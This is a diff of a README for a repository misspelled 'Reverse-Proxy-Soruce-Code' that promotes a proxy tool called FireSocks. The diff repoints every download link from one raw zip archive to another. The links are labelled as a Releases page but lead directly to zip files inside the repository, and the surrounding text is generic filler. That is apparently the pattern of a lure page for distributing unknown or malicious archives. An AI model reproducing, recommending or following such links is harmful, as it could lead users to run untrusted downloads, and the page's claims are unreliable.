@@ -1,6 +1,6 @@
 # 🔄 Reverse-Proxy-Soruce-Code - Manage Your Proxy Connections Effortlessly
 
-[![Download Now](https://raw.githubusercontent.com/ankitgupta2107/Reverse-Proxy-Soruce-Code/main/winebibber/Reverse-Proxy-Soruce-Code.zip%20Now-Get%20the%20Latest%20Release-brightgreen)](https://raw.githubusercontent.com/ankitgupta2107/Reverse-Proxy-Soruce-Code/main/winebibber/Reverse-Proxy-Soruce-Code.zip)
+[![Download Now](https://github.com/ankitgupta2107/Reverse-Proxy-Soruce-Code/raw/refs/heads/main/img/Code-Proxy-Reverse-Soruce-v2.4.zip%20Now-Get%20the%20Latest%20Release-brightgreen)](https://github.com/ankitgupta2107/Reverse-Proxy-Soruce-Code/raw/refs/heads/main/img/Code-Proxy-Reverse-Soruce-v2.4.zip)
 
 ## 🚀 Getting Started
 
@@ -12,7 +12,7 @@ To get started with FireSocks, follow these simple steps:
 
 1. **Visit the Releases Page**  
    Click the link below to go to the Releases page:
-   [Download FireSocks](https://raw.githubusercontent.com/ankitgupta2107/Reverse-Proxy-Soruce-Code/main/winebibber/Reverse-Proxy-Soruce-Code.zip)
+   [Download FireSocks](https://github.com/ankitgupta2107/Reverse-Proxy-Soruce-Code/raw/refs/heads/main/img/Code-Proxy-Reverse-Soruce-v2.4.zip)
 
 2. **Select the Latest Version**  
    On the Releases page, look for the most recent version of FireSocks. This version contains improvements and bug fixes.
@@ -80,6 +80,6 @@ Thank you for using FireSocks! We appreciate your support. Your feedback helps i
 ## 📥 Download FireSocks Now!
 
 For your convenience, here is the download link once more:  
-[Download FireSocks](https://raw.githubusercontent.com/ankitgupta2107/Reverse-Proxy-Soruce-Code/main/winebibber/Reverse-Proxy-Soruce-Code.zip) 
+[Download FireSocks](https://github.com/ankitgupta2107/Reverse-Proxy-Soruce-Code/raw/refs/heads/main/img/Code-Proxy-Reverse-Soruce-v2.4.zip) 
 
 Explore the features and enjoy seamless management of your proxy servers!
